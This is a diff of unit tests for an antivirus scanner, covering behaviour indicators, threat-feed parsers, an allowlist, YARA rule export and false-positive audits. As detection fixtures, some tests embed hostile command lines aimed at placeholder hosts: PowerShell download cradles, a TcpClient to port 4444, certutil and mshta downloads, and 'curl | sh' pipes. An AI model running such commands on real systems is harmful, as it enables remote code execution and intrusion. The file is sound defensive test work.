@@ -355,7 +355,7 @@ class BehaviorTests(unittest.TestCase):
 
     def test_powershell_indicators(self):
         ps = (
-            "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\n"
+            "IEX (New-Object Net.WebClient).DownloadString('http://x.example.com/a')\n"
             "$a = \"-ExecutionPolicy Bypass\"\n"
             "$t = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)\n"
         )
@@ -367,8 +367,8 @@ class BehaviorTests(unittest.TestCase):
     def test_batch_indicators(self):
         bat = (
             "@echo off\n"
-            "certutil -urlcache -f -split http://x.example/d.exe %%TEMP%%\\d.exe\n"
-            "mshta http://x.example/x.hta\n"
+            "certutil -urlcache -f -split http://x.example.com/d.exe %%TEMP%%\\d.exe\n"
+            "mshta http://x.example.com/x.hta\n"
         )
         names = {f.name for f in self._behavior(self._scan("d.bat", bat))}
         self.assertIn("certutil URL download (LOLBin)", names)
@@ -392,7 +392,7 @@ class BehaviorTests(unittest.TestCase):
 
     def test_non_executable_document_not_analysed(self):
         # Same dangerous text, but in a .txt document -> not executable-looking.
-        findings = self._scan("notes.txt", "curl http://x.example/x.sh | sh\n")
+        findings = self._scan("notes.txt", "curl http://x.example.com/x.sh | sh\n")
         # …so the *behaviour* layer stays out of it,
         self.assertEqual(self._behavior(findings), [])
         # …but v2.8's technique-indicator layer reports the download pipe.
@@ -409,7 +409,7 @@ class BehaviorTests(unittest.TestCase):
 
     def test_behavior_can_be_disabled(self):
         sh = self.base / "s.sh"
-        sh.write_text("curl http://x.example/x.sh | sh\n")
+        sh.write_text("curl http://x.example.com/x.sh | sh\n")
         self.assertTrue(self._behavior(self.scanner.scan_file(sh)))
         self.scanner.config.behavior_enabled = False
         self.assertEqual(self._behavior(self.scanner.scan_file(sh)), [])
@@ -4515,20 +4515,23 @@ class FeedTests(unittest.TestCase):
     def test_hosts_parser_handles_all_three_forms(self):
         text = ("# comment\n"
                 "0.0.0.0 malware.example.com\n"
-                "127.0.0.1\tads.example.net\n"
+                "127.0.0.1\tads.example.com.net\n"
                 "bare.example.org\n"
                 "0.0.0.0 localhost\n"          # plumbing, dropped
                 "0.0.0.0 something.invalid\n"  # .invalid, dropped
                 "\n")
         values = [i.value for i in self.feeds.parse_hosts(text)]
-        self.assertEqual(values, ["malware.example.com", "ads.example.net",
+        self.assertEqual(values, ["malware.example.com", "ads.example.com.net",
                                   "bare.example.org"])
 
     def test_ip_parser_rejects_placeholders_and_accepts_hosts_form(self):
         text = "1.2.3.4\n0.0.0.0\n127.0.0.1\n255.255.255.255\n" \
-               "0.0.0.0 5.6.7.8\n10.0.0.9\n"
+               "0.0.0.0 5.6.7.8\n10.0.0.9\n192.168.4.4\n"
         values = [i.value for i in self.feeds.parse_ip_list(text)]
-        self.assertEqual(values, ["1.2.3.4", "5.6.7.8", "10.0.0.9"])
+        # v3.0: private/loopback/reserved space is never indexed - a LAN
+        # address in a blocklist only produces false positives on the
+        # internal traffic of whoever runs the scanner
+        self.assertEqual(values, ["1.2.3.4", "5.6.7.8"])
 
     def test_hash_csv_parses_three_columns(self):
         row = ("013c7708f1343d684e3571453261b586,"
@@ -4783,6 +4786,659 @@ class FeedTests(unittest.TestCase):
             code = cli.main(["version", "--json"])
         info = json.loads(buffer.getvalue())
         self.assertIn("feeds", info["engines"])
+
+
+class AllowlistTests(unittest.TestCase):
+    """v3.0 false-positive allowlist: hashes, names, paths, domains."""
+
+    def setUp(self):
+        self.tmp = Path(tempfile.mkdtemp(prefix="av-allow-"))
+        self.addCleanup(shutil.rmtree, self.tmp, True)
+        self.path = self.tmp / "allowlist.json"
+
+    def _engine(self, entries=None, path=None):
+        config = Config()
+        config.cache_enabled = False
+        # every stage writes its own allowlist file: reusing one file would
+        # accumulate entries from earlier stages and mask the assertion
+        config.allowlist_file = path or self.path
+        config.report_dir = self.tmp / "reports"
+        config.quarantine_dir = self.tmp / "quarantine"
+        engine = Scanner(config, SignatureDB(Path("data/signatures.json")))
+        if entries:
+            for kind, value in entries:
+                engine.allowlist().add(kind, value)
+            engine.allowlist().save()
+            engine._allow = None
+        return engine
+
+    def test_add_rejects_bad_kind_and_hash(self):
+        from antivirus.allowlist import AllowList
+
+        allow = AllowList(self.path)
+        with self.assertRaises(ValueError):
+            allow.add("colour", "red")
+        with self.assertRaises(ValueError):
+            allow.add("hash", "not-a-hash")
+        with self.assertRaises(ValueError):
+            allow.add("hash", "z" * 64)
+        entry, created = allow.add("hash", "A" * 64)
+        self.assertTrue(created)
+        self.assertEqual(entry.value.lower(), "a" * 64)
+
+    def test_roundtrip_and_dedup(self):
+        from antivirus.allowlist import AllowList
+
+        allow = AllowList(self.path)
+        allow.add("domain", "example.com", note="ours")
+        allow.add("name", "*.ps1")
+        _, created = allow.add("domain", "EXAMPLE.com")
+        self.assertFalse(created)
+        allow.save()
+        again = AllowList.load(self.path)
+        self.assertEqual(again.stats()["total"], 2)
+        self.assertIsNotNone(again.check_domain("example.com"))
+        # deterministic ids: reloading must produce the same id
+        self.assertEqual(sorted(e.id for e in allow.entries),
+                         sorted(e.id for e in again.entries))
+
+    def test_check_kinds(self):
+        from antivirus.allowlist import AllowList
+
+        allow = AllowList(self.path)
+        allow.add("name", "*.bak")
+        allow.add("path", "/srv/legacy/*")
+        allow.add("hash", "b" * 64)
+        self.assertIsNotNone(allow.check("/tmp/report.bak"))
+        self.assertIsNotNone(allow.check("/srv/legacy/old.exe"))
+        self.assertIsNotNone(allow.check("/x/y.exe", sha256="B" * 64))
+        self.assertIsNone(allow.check("/x/y.exe"))
+        # a domain entry does not silently cover a path check
+        allow.add("domain", "*.corp.example")
+        self.assertIsNotNone(allow.check_domain("vpn.corp.example"))
+        self.assertIsNone(allow.check_domain("evil.example"))
+
+    def test_scanner_skips_allowlisted_file(self):
+        eicar = (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-"
+                 b"TEST-FILE!$H+H*")
+        sample = self.tmp / "sample.bin"
+        sample.write_bytes(eicar)
+        digest = hashlib.sha256(eicar).hexdigest()
+
+        engine = self._engine()
+        self.assertTrue(engine.scan_file(sample))
+        engine = self._engine([("hash", digest)],
+                              path=self.tmp / "by-hash.json")
+        self.assertEqual(engine.scan_file(sample), [])
+        self.assertEqual(engine.allowlist_suppressed, 1)
+
+        # a name glob works too, and a glob that does not match leaves the
+        # finding intact
+        engine = self._engine([("name", "sample.*")],
+                              path=self.tmp / "by-name.json")
+        self.assertEqual(engine.scan_file(sample), [])
+        engine = self._engine([("name", "other.*")],
+                              path=self.tmp / "no-match.json")
+        self.assertTrue(engine.scan_file(sample))
+
+    def test_disabled_allowlist_is_ignored(self):
+        eicar = (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-"
+                 b"TEST-FILE!$H+H*")
+        sample = self.tmp / "sample.bin"
+        sample.write_bytes(eicar)
+        engine = self._engine([("name", "sample.bin")],
+                              path=self.tmp / "disabled.json")
+        engine.config.allowlist_enabled = False
+        engine._allow = None
+        self.assertTrue(engine.scan_file(sample))
+
+    def test_cache_profile_tracks_allowlist(self):
+        engine = self._engine()
+        before = engine._cache_profile()
+        engine.allowlist().add("domain", "example.com")
+        engine.allowlist().save()
+        self.assertNotEqual(before, engine._cache_profile())
+
+    def test_domain_filter_keeps_other_findings(self):
+        from antivirus.allowlist import AllowList
+
+        allow = AllowList(self.path)
+        allow.add("domain", "suppressed.example")
+        kept, dropped = allow.filter_findings([
+            Finding(path="a.js", kind="feed-ioc", name="feed domain",
+                    severity="critical",
+                    message="Feed-listed domain 'suppressed.example'"),
+            Finding(path="a.js", kind="feed-ioc", name="feed domain",
+                    severity="critical",
+                    message="Feed-listed domain 'still-bad.example.com'"),
+            Finding(path="a.js", kind="signature-hash", name="EICAR",
+                    severity="critical", message="matches signature"),
+        ])
+        self.assertEqual(len(dropped), 1)
+        self.assertEqual(len(kept), 2)
+
+    def test_add_hash_from_file(self):
+        from antivirus.allowlist import AllowList, add_hash_from_file
+
+        sample = self.tmp / "tool.bin"
+        sample.write_bytes(b"internal tool")
+        allow = AllowList(self.path)
+        entry = add_hash_from_file(allow, sample, note="our tool")
+        self.assertEqual(entry.kind, "hash")
+        self.assertEqual(entry.value,
+                         hashlib.sha256(b"internal tool").hexdigest())
+        self.assertEqual(entry.source, "scan")
+
+    def test_cli_add_check_remove(self):
+        from antivirus import cli
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["allowlist", "add", "domain",
+                                       "corp.example", "--note", "ours",
+                                       "--allowlist-file", str(self.path)]), 0)
+        self.assertIn("allowlisted", buffer.getvalue())
+
+        with contextlib.redirect_stdout(io.StringIO()):
+            self.assertEqual(cli.main(["allowlist", "check", "corp.example",
+                                       "--allowlist-file", str(self.path)]), 0)
+            self.assertEqual(cli.main(["allowlist", "check", "evil.example",
+                                       "--allowlist-file", str(self.path)]), 1)
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["allowlist", "list", "--json",
+                                       "--allowlist-file", str(self.path)]), 0)
+        payload = json.loads(buffer.getvalue())
+        self.assertEqual(payload["stats"]["domain"], 1)
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["allowlist", "remove", "corp.example",
+                                       "--allowlist-file", str(self.path)]), 0)
+        self.assertIn("removed", buffer.getvalue())
+
+    def test_cli_from_findings(self):
+        from antivirus import cli
+
+        report = self.tmp / "report.json"
+        report.write_text(json.dumps({"findings": [
+            {"sha256": "c" * 64},
+            {"sha256": "d" * 64},
+            {"sha256": "c" * 64},
+        ]}), encoding="utf-8")
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["allowlist", "from-findings",
+                                       str(report), "--allowlist-file",
+                                       str(self.path)]), 0)
+        self.assertIn("2 item", buffer.getvalue())
+
+    def test_cli_audit_flags_unexplained_hashes(self):
+        from antivirus import cli
+
+        with contextlib.redirect_stdout(io.StringIO()):
+            cli.main(["allowlist", "add", "hash", "e" * 64,
+                      "--allowlist-file", str(self.path)])
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["allowlist", "audit",
+                                       "--allowlist-file", str(self.path)]), 0)
+        self.assertIn("without an explanation", buffer.getvalue())
+
+
+class YaraRulesTests(unittest.TestCase):
+    """v3.0 YARA export: quoting, regex conversion and skip accounting."""
+
+    def test_escape_and_identifier(self):
+        from antivirus import yararules as yr
+
+        self.assertEqual(yr.yara_escape('a"b\\c'), 'a\\"b\\\\c')
+        self.assertEqual(yr.yara_identifier("IND-EXEC-1"), "IND_EXEC_1")
+        self.assertEqual(yr.yara_identifier("1abc"), "r_1abc")
+
+    def test_regex_conversion(self):
+        from antivirus import yararules as yr
+
+        self.assertEqual(yr.regex_to_yara(r"foo\.exe"), r"/foo\.exe/")
+        self.assertEqual(yr.regex_to_yara(r"(?i)WinWord"), "/WinWord/i")
+        self.assertEqual(yr.regex_to_yara(r"(?:a|b)c"), "/(a|b)c/")
+        # unsupported constructs must be refused, never approximated
+        for bad in (r"(?=look)", r"(?<=behind)", r"\1", r"^anchor", r"end$",
+                    r"(?i:inline)"):
+            self.assertIsNone(yr.regex_to_yara(bad), bad)
+
+    def test_signature_rules_and_skips(self):
+        from antivirus import yararules as yr
+
+        stats = yr.YaraStats()
+        rules = yr.from_signatures([
+            {"id": "S1", "pattern": r"evil\.exe", "severity": "high",
+             "category": "realworld", "description": "d"},
+            {"id": "S2", "pattern": "", "sha256": "a" * 64, "severity": "high"},
+            {"id": "S3", "pattern": "(?=nope)", "severity": "low"},
+            {"id": "S4", "pattern": "", "severity": "low"},
+        ], stats)
+        self.assertEqual(len(rules), 1)
+        self.assertIn("AV_SIG_S1", rules[0])
+        self.assertIn("/evil\.exe/", rules[0])
+        self.assertEqual(stats.skipped_hash_only, 1)
+        self.assertEqual(stats.skipped_regex, ["S3"])
+
+    def test_rule_never_quotes_twice(self):
+        from antivirus import yararules as yr
+
+        text, _ = yr.generate(signatures=[
+            {"id": "S", "pattern": "Raves", "severity": "medium"}],
+            checks=[], patterns=[])
+        self.assertIn('$a = "Raves"', text)
+        self.assertNotIn('$a = ""', text)
+
+    def test_generated_ruleset_shape(self):
+        from antivirus import yararules as yr
+
+        text, stats = yr.generate(signatures=[], checks=[
+            _FakeCheck()], patterns=[])
+        self.assertIn('rule AV_IND_IND_TEST_ONE', text)
+        self.assertIn("import \"hash\"", text)
+        self.assertEqual(stats.rules, 1)
+        self.assertIn("condition:", text)
+        # empty-string patterns cannot be expressed and must be skipped
+        text, stats = yr.generate(signatures=[], checks=[_FakeCheck("")],
+                                  patterns=[])
+        self.assertEqual(stats.rules, 0)
+
+    def test_feed_literals_are_unescaped(self):
+        from antivirus import yararules as yr
+
+        text, stats = yr.generate(signatures=[], checks=[], patterns=[
+            {"pattern": "658C8B7F\\-3664\\-4A95", "severity": "high",
+             "source": "mandiant-yara", "id": "FEED-1"}])
+        self.assertEqual(stats.feed, 1)
+        self.assertIn('"658C8B7F-3664-4A95" ascii wide', text)
+        # short literals are useless in a rule and are dropped
+        _, stats = yr.generate(signatures=[], checks=[], patterns=[
+            {"pattern": "abc", "severity": "high"}])
+        self.assertEqual(stats.feed, 0)
+
+    def test_write_and_verify_without_yara(self):
+        from antivirus import yararules as yr
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-yara-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        text, _ = yr.generate(signatures=[], checks=[], patterns=[])
+        out = yr.write(text, tmp / "sub" / "rules.yar")
+        self.assertTrue(out.exists())
+        result = yr.verify(out)
+        self.assertIn("available", result)
+        if not result["available"]:
+            self.assertIn("not installed", result["detail"])
+
+    def test_cli_writes_ruleset(self):
+        from antivirus import cli
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-yara-cli-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        out = tmp / "rules.yar"
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            code = cli.main(["yara", "--out", str(out), "--no-feeds"])
+        self.assertEqual(code, 0)
+        self.assertIn("rule(s)", buffer.getvalue())
+        self.assertIn("rule AV_SIG_EICAR_STD_2014", out.read_text("utf-8"))
+
+
+class _FakeCheck:
+    def __init__(self, pattern=r"malware-payload"):
+        self.id = "IND-TEST-ONE"
+        self.name = "test"
+        self.category = "execution"
+        self.severity = "high"
+        self.description = "test check"
+        self.tags = ["test"]
+        self.patterns = (pattern,) if pattern else ("",)
+        self.filenames = ()
+        self.require = None
+
+
+class FPCheckTests(unittest.TestCase):
+    """v3.0 false-positive audit harness."""
+
+    def test_blob_audit_is_clean(self):
+        from antivirus import fpcheck
+
+        report = fpcheck.audit_blobs(blobs=3, size=64 * 1024, seeds=(1, 2))
+        self.assertEqual(report.total_files, 6)
+        self.assertTrue(report.clean, report.summary())
+        self.assertEqual(report.flagged_files, 0)
+
+    def test_text_corpus_is_clean(self):
+        from antivirus import fpcheck
+
+        report = fpcheck.audit_text()
+        self.assertIn("python", report.per_corpus)
+        self.assertIn("powershell", report.per_corpus)
+        for hit in report.hits:
+            self.fail(f"benign {hit.file} flagged by {hit.check} "
+                      f"({hit.severity})")
+
+    def test_severity_threshold_filters_findings(self):
+        from antivirus import fpcheck
+
+        low = fpcheck.audit_text(min_severity="critical")
+        self.assertTrue(low.clean)
+
+    def test_report_shape_and_summary(self):
+        from antivirus import fpcheck
+
+        report = fpcheck.run(blobs=1, size=8 * 1024, seeds=(9,))
+        payload = report.to_dict()
+        self.assertIn("false_positive_rate", payload)
+        self.assertIn("by_corpus", payload)
+        self.assertTrue(payload["clean"])
+        self.assertIn("no indicator", report.summary())
+
+    def test_detector_exception_never_crashes(self):
+        from antivirus import fpcheck
+
+        report = fpcheck.FPReport(total_files=0)
+        self.assertTrue(report.clean)
+        self.assertEqual(report.rate, 0.0)
+
+    def test_corpus_summary_lists_files(self):
+        from antivirus import fpcheck
+
+        names = [name for _, name, size in fpcheck.corpus_summary() if size]
+        self.assertIn("app.py", names)
+        self.assertIn("deploy.sh", names)
+
+    def test_cli_fpcheck(self):
+        from antivirus import cli
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            code = cli.main(["fpcheck", "--blobs", "1", "--size", "16"])
+        self.assertEqual(code, 0)
+        self.assertIn("false-positive audit", buffer.getvalue())
+
+
+class ParserTests(unittest.TestCase):
+    """v3.0 feed parsers: adblock, url-hosts, ip-count tiers, tweetfeed, wildcards."""
+
+    def test_parse_adblock(self):
+        from antivirus import feeds
+
+        text = "\n".join([
+            "! comment",
+            "[Adblock Plus 2.0]",
+            "||evil-domain.example.com^",
+            "||evil-domain.example.com^$third-party",
+            "@@||good.example.com^",
+            "||ads.tracker.example.com/path^",
+            "||evil-domain.example.com^$image,script"])
+        values = {ioc.value: ioc for ioc in feeds.parse_adblock(text)}
+        self.assertIn("evil-domain.example.com", values)
+        self.assertIn("ads.tracker.example.com", values)
+        self.assertNotIn("good.example.com", values)   # @@ = exception rule
+        self.assertEqual(values["evil-domain.example.com"].kind, "domain")
+
+    def test_parse_url_hosts(self):
+        from antivirus import feeds
+
+        text = "\n".join([
+            "# comment",
+            "https://bad.example.com/phish/login.php",
+            "http://other.example.com/x",
+            "not a url",
+            "https://192.168.1.1/a"])
+        values = {ioc.value for ioc in feeds.parse_url_hosts(text)}
+        # the private address in the sample is deliberately dropped: it
+        # describes a LAN, not a threat
+        self.assertEqual(values, {"bad.example.com", "other.example.com"})
+
+    def test_private_and_reserved_ips_are_not_indexed(self):
+        """192.168/10/127/0/224+ addresses cannot be internet indicators."""
+        from antivirus import feeds
+
+        text = "\n".join(["192.168.1.1", "10.0.0.5", "127.0.0.1", "0.0.0.0",
+                           "224.0.0.1", "172.16.9.9", "172.32.0.1",
+                           "169.254.10.10", "203.0.113.9"])
+        values = [ioc.value for ioc in feeds.parse_ip_list(text)]
+        self.assertEqual(values, ["172.32.0.1", "203.0.113.9"])
+        self.assertTrue(feeds.is_private_ip("192.168.0.1"))
+        self.assertTrue(feeds.is_private_ip("172.31.255.255"))
+        self.assertFalse(feeds.is_private_ip("172.32.0.0"))
+        self.assertFalse(feeds.is_private_ip("8.8.8.8"))
+
+    def test_adblock_path_rules_keep_the_domain(self):
+        from antivirus import feeds
+
+        text = "\n".join(["||ads.tracker.example.com/path^$third-party",
+                           "||plain-bad.com^"])
+        values = {ioc.value for ioc in feeds.parse_adblock(text)}
+        self.assertEqual(values, {"ads.tracker.example.com", "plain-bad.com"})
+
+    def test_parse_ip_count_tiers(self):
+        from antivirus import feeds
+
+        text = "1.1.1.1\t1\n2.2.2.2\t3\n3.3.3.3\t8\n8.8.8.8\t0"
+        tiers = {ioc.value: ioc.severity for ioc in feeds.parse_ip_count(text)}
+        self.assertEqual(tiers["1.1.1.1"], "medium")
+        self.assertEqual(tiers["2.2.2.2"], "high")
+        self.assertEqual(tiers["3.3.3.3"], "critical")
+        self.assertEqual(tiers["8.8.8.8"], "medium")
+        # malformed lines are skipped, never guessed at
+        self.assertEqual(list(feeds.parse_ip_count("garbage line\n")), [])
+
+    def test_parse_tweetfeed_csv(self):
+        from antivirus import feeds
+
+        header = "timestamp,reporter,type,value,tags,source"
+        text = "\n".join([
+            header,
+            '2026-01-01T00:00:00Z,@someone,domain,bad.example.com,"#malware",tweet',
+            '2026-01-01T00:00:00Z,@someone,ip,9.9.9.9,"#c2",tweet',
+            "2026-01-01T00:00:00Z,@someone,sha256," + "a" * 64 + ",#hash,tweet",
+            "2026-01-01T00:00:00Z,@someone,cve,CVE-2026-0001,#cve,tweet",
+            "2026-01-01T00:00:00Z,@someone,url,https://x.example.com/p,#phish,tweet"])
+        iocs = list(feeds.parse_tweetfeed_csv(text))
+        kinds = {ioc.kind for ioc in iocs}
+        # a URL row is indexed by its host: the database answers "is this
+        # domain bad", and a full URL would never match a domain lookup
+        self.assertEqual(kinds, {"domain", "ip", "sha256"})
+        values = {ioc.value for ioc in iocs}
+        self.assertIn("x.example.com", values)
+        self.assertNotIn("cve", kinds)
+
+    def test_reserved_tlds_are_never_indexed(self):
+        """``.example``/``.invalid``/``.test`` cannot be real IOCs."""
+        from antivirus import feeds
+
+        text = "\n".join(["bad.example", "worse.invalid", "x.test"])
+        self.assertEqual(list(feeds.parse_domains(text)), [])
+        self.assertEqual(list(feeds.parse_wildcard_domains(text)), [])
+
+    def test_parse_wildcard_domains(self):
+        from antivirus import feeds
+
+        text = "\n".join(["# header", "*.tracker.example.com", "*.ads.example.com",
+                          "plain.example.com"])
+        values = {ioc.value for ioc in feeds.parse_wildcard_domains(text)}
+        self.assertEqual(values, {"tracker.example.com", "ads.example.com",
+                                  "plain.example.com"})
+
+    def test_tiered_source_chooses_own_bucket(self):
+        from antivirus import feeds
+
+        source = feeds.FeedSource(
+            id="tier-test", name="n", provider="p", repo="o/r", path="f",
+            parser="ip-count", kind="ip", category="malware",
+            severity="high", license="Unlicense", license_url="u",
+            redistribution="redistributable", homepage="h", tiered=True)
+        buckets = {}
+
+        def fake_fetch(src, **kwargs):
+            return b"1.1.1.1\t1\n2.2.2.2\t9"
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-tier-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        feeds.build([source], tmp, fetch=fake_fetch)
+        db = feeds.FeedDB(tmp)
+        buckets = db.counts()
+        self.assertEqual(buckets.get("ip.critical"), 1)
+        self.assertEqual(buckets.get("ip.medium"), 1)
+
+    def test_untiered_source_uses_source_severity(self):
+        from antivirus import feeds
+
+        source = feeds.FeedSource(
+            id="flat-test", name="n", provider="p", repo="o/r", path="f",
+            parser="domains", kind="domain", category="malware",
+            severity="critical", license="MIT", license_url="u",
+            redistribution="redistributable", homepage="h")
+
+        def fake_fetch(src, **kwargs):
+            return b"a.example.com\nb.example.com"
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-flat-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        feeds.build([source], tmp, fetch=fake_fetch)
+        self.assertEqual(feeds.FeedDB(tmp).counts().get("domain.critical"), 2)
+
+    def test_trusted_hosts_are_never_indexed(self):
+        """A phishing URL hosted on github.com must not make the *host* bad."""
+        from antivirus import feeds
+
+        self.assertTrue(feeds.is_trusted_host("github.com"))
+        self.assertTrue(feeds.is_trusted_host("GitHub.COM."))
+        self.assertTrue(feeds.is_trusted_host("bit.ly"))
+        # specific tenants stay precise indicators
+        self.assertFalse(feeds.is_trusted_host("evil.blogspot.com"))
+        self.assertFalse(feeds.is_trusted_host("pool.minexmr.com"))
+
+        source = feeds.FeedSource(
+            id="trust-test", name="n", provider="p", repo="o/r", path="f",
+            parser="url-hosts", kind="domain", category="phishing",
+            severity="high", license="MIT", license_url="u",
+            redistribution="redistributable", homepage="h")
+
+        def fake_fetch(src, **kwargs):
+            return (b"https://github.com/attacker/phish\n"
+                    b"https://bit.ly/3xY\n"
+                    b"https://real-phish.example.org/login\n")
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-trust-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        report = feeds.build([source], tmp, fetch=fake_fetch)
+        db = feeds.FeedDB(tmp)
+        self.assertIsNone(db.lookup_domain("github.com"))
+        self.assertIsNone(db.lookup_domain("bit.ly"))
+        self.assertIsNotNone(db.lookup_domain("real-phish.example.org"))
+        self.assertEqual(db.counts().get("domain.high"), 1)
+        self.assertGreaterEqual(
+            report.sources[0]["skipped"].get("trusted-host", 0), 1)
+
+    def test_old_database_cannot_flag_trusted_hosts(self):
+        """The lookup guard protects a database built before the rule."""
+        from antivirus import feeds
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-trust2-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        feeds.write_index(tmp, "domain.high",
+                          [feeds.token_digest("github.com"),
+                           feeds.token_digest("bad-c2.example.org")],
+                          {"source": "hand-made"})
+        (tmp / "manifest.json").write_text(json.dumps(
+            {"indexes": {"domain.high": {"count": 2}}}), encoding="utf-8")
+        db = feeds.FeedDB(tmp)
+        self.assertIsNone(db.lookup_domain("github.com"))
+        self.assertIsNotNone(db.lookup_domain("bad-c2.example.org"))
+
+    def test_manifest_tolerates_hand_edits(self):
+        from antivirus import feeds
+
+        tmp = Path(tempfile.mkdtemp(prefix="av-manifest-"))
+        self.addCleanup(shutil.rmtree, tmp, True)
+        (tmp / "manifest.json").write_text(json.dumps({
+            "indexes": {"domain.high": 5, "domain.low": {"count": 2},
+                        "ip.high": None, "x": [1, 2, 3]}}), encoding="utf-8")
+        counts = feeds.FeedDB(tmp).counts()
+        self.assertEqual(counts["domain.high"], 5)
+        self.assertEqual(counts["domain.low"], 2)
+        self.assertEqual(counts["ip.high"], 0)
+        self.assertEqual(counts["x"], 3)
+
+    def test_every_source_round_trips(self):
+        from antivirus import feeds
+
+        for source in feeds.SOURCES:
+            payload = source.to_dict()
+            self.assertIn(payload["redistribution"],
+                          ("redistributable", "runtime-only"))
+            self.assertTrue(payload["license"])
+            self.assertTrue(payload["license_url"].startswith("http"))
+            self.assertIn(payload["parser"], feeds.PARSERS)
+            self.assertIsInstance(payload["tiered"], bool)
+
+
+class IndicatorLibraryTests(unittest.TestCase):
+    """v3.0 indicator library: unique ids, compiling patterns, no loopback FPs."""
+
+    def test_ids_unique_and_prefixed(self):
+        from antivirus import indicators
+
+        ids = [check.id for check in indicators.CHECKS]
+        self.assertEqual(len(ids), len(set(ids)))
+        for check_id in ids:
+            self.assertTrue(check_id.startswith("IND-"), check_id)
+
+    def test_every_pattern_compiles_and_does_not_match_empty(self):
+        import re as re_mod
+
+        from antivirus import indicators
+
+        for check in indicators.CHECKS:
+            for pattern in check.patterns:
+                compiled = re_mod.compile(pattern)
+                self.assertIsNone(compiled.search(""),
+                                  f"{check.id}: pattern matches empty text")
+
+    def test_categories_and_severities_are_valid(self):
+        from antivirus import indicators
+
+        for check in indicators.CHECKS:
+            self.assertIn(check.severity,
+                          ("low", "medium", "high", "critical"), check.id)
+            self.assertTrue(check.description.strip(), check.id)
+            self.assertTrue(check.category, check.id)
+
+    def test_loopback_download_is_not_flagged(self):
+        from antivirus import indicators
+
+        for text in (b"curl http://127.0.0.1:8080/healthz",
+                     b"curl -fsS http://0.0.0.0:9000/ping",
+                     b"iwr http://10.1.2.3/stage.ps1 -OutFile a.ps1"):
+            names = {f.name for f in indicators.analyze("t.sh", text,
+                                                        filename="t.sh")}
+            self.assertNotIn("Download from a bare IP", names)
+
+    def test_external_ip_download_is_flagged(self):
+        from antivirus import indicators
+
+        names = {f.name for f in indicators.analyze(
+            "t.sh", b"curl http://203.0.113.44/gate.php", filename="t.sh")}
+        self.assertIn("Download from a bare IP", names)
+
+    def test_matrix_cli_covers_every_check(self):
+        from antivirus import cli, indicators
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            self.assertEqual(cli.main(["matrix", "--json"]), 0)
+        payload = json.loads(buffer.getvalue())
+        self.assertEqual(payload["total"], len(indicators.CHECKS))
+        self.assertEqual(sum(t["checks"] for t in payload["tactics"]),
+                         len(indicators.CHECKS))
 
 
 if __name__ == "__main__":
